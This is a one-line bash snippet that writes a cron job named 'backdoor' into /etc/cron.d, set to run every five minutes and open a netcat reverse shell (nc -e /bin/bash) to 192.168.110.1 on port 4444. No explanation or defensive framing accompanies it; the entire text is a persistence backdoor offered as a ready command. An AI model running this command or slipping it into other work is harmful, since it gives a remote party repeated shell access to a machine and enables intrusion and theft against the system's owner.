bash
     echo "*/5 * * * * /bin/bash -c 'nc -e /bin/bash 192.168.110.1 4444'" > /etc/cron.d/backdoor